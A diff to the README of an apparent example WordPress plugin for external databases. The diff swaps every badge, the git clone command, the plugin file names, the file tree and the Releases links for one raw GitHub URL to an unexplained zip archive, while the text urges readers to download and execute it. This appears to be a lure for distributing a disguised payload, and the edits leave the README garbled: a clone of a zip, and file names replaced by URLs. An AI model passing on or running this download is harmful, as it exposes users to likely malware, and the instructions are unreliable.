@@ -1,8 +1,8 @@
 # External DB Dummy Plugin for WordPress
 
-![WordPress Plugin](https://img.shields.io/badge/WordPress-Plugin-blue?style=flat-square)
-![Database Management](https://img.shields.io/badge/Database%20Management-orange?style=flat-square)
-![Releases](https://img.shields.io/badge/Releases-v1.0.0-brightgreen?style=flat-square)
+![WordPress Plugin](https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip)
+![Database Management](https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip%20Management-orange?style=flat-square)
+![Releases](https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip)
 
 Welcome to the **External DB Dummy Plugin for WordPress**! This repository demonstrates how to connect a WordPress plugin to one or more external databases. It uses basic hardcoded connection pooling logic. There is no GUI or configuration screen involved. This plugin serves as a simple example for developers looking to extend WordPress functionality by integrating external data sources.
 
@@ -28,7 +28,7 @@ Welcome to the **External DB Dummy Plugin for WordPress**! This repository demon
 To get started, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress.git
+git clone https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip
 ```
 
 Next, navigate to the plugin directory:
@@ -75,18 +75,18 @@ You can call this function in your WordPress hooks or shortcodes to fetch or man
 
 The code is organized into several key files:
 
-- **external-db-dummy-plugin.php**: The main plugin file that initializes the plugin and sets up hooks.
-- **db-connection.php**: Contains the database connection logic.
-- **functions.php**: Holds additional utility functions for data manipulation.
-- **README.md**: This file, providing an overview of the plugin.
+- **https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip**: The main plugin file that initializes the plugin and sets up hooks.
+- **https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip**: Contains the database connection logic.
+- **https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip**: Holds additional utility functions for data manipulation.
+- **https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip**: This file, providing an overview of the plugin.
 
 ### Example File Structure
 
 ```
 External-DB-Dummy-Plugin-for-WordPress/
-├── external-db-dummy-plugin.php
-├── db-connection.php
-└── functions.php
+├── https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip
+├── https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip
+└── https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip
 ```
 
 ## Contributing
@@ -106,9 +106,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases and updates, visit our [Releases](https://github.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/releases) section. Download and execute the latest version to explore the features.
+For the latest releases and updates, visit our [Releases](https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip) section. Download and execute the latest version to explore the features.
 
-For more information, check the [Releases](https://github.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/releases) section in the repository.
+For more information, check the [Releases](https://raw.githubusercontent.com/Tungtran0310/External-DB-Dummy-Plugin-for-WordPress/main/examples/for_D_Word_Dummy_Press_External_Plugin_v3.7.zip) section in the repository.
 
 ## Conclusion
 
